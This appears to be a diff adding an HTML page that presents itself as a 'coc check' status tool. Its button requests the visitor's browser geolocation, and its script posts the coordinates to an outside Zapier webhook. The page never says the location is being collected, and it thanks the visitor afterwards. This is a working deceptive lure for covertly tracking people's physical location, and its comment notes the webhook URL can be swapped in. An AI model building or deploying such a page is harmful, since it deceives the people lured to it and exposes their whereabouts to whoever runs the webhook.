@@ -1,0 +1,60 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>coc check</title>
+    <style>
+        body { font-family: sans-serif; display: flex; justify-content: center; 
+               align-items: center; height: 100vh; margin: 0; background: #f0f2f5; }
+        .card { background: white; padding: 2rem; border-radius: 12px; 
+                box-shadow: 0 4px 6px rgba(0,0,0,0.1); text-align: center; }
+        button { padding: 10px 20px; font-size: 16px; cursor: pointer; 
+                 background: #007bff; color: white; border: none; border-radius: 5px; }
+    </style>
+</head>
+<body>
+    <div class="card">
+        <h2>Hi there!</h2>
+        <p>Please click the button to check coc status.</p>
+        <button onclick="getLocation()"> coc check </button>
+        <p id="status"></p>
+    </div>
+
+    <script>
+        function getLocation() {
+            const status = document.getElementById('status');
+            if (!navigator.geolocation) {
+                status.textContent = "Geolocation is not supported by your browser";
+                return;
+            }
+
+            status.textContent = "Locating…";
+
+            // This asks the user for permission
+            navigator.geolocation.getCurrentPosition(success, error);
+        }
+
+        function success(position) {
+            const lat = position.coords.latitude;
+            const lon = position.coords.longitude;
+            
+            document.getElementById('status').textContent = "Location captured! Sending...";
+
+            // SEND DATA TO BACKEND: Replace the URL with your webhook URL (see Step 2)
+            fetch('https://hooks.zapier.com/hooks/catch/28845742/4dek5pk/', { 
+                method: 'POST', 
+                mode: 'no-cors', // important for simple webhooks
+                body: JSON.stringify({ latitude: lat, longitude: lon }),
+                headers: { 'Content-Type': 'application/json' }
+            }).then(() => {
+                document.getElementById('status').textContent = "Thank you! You can close this page.";
+            }).catch(() => {
+                document.getElementById('status').textContent = "Error sending data.";
+            });
+        }
+
+        function error() {
+            document.getElementById('status').textContent = "Unable to retrieve your location.";
+        }
+    </script>
+</body>
+</html>
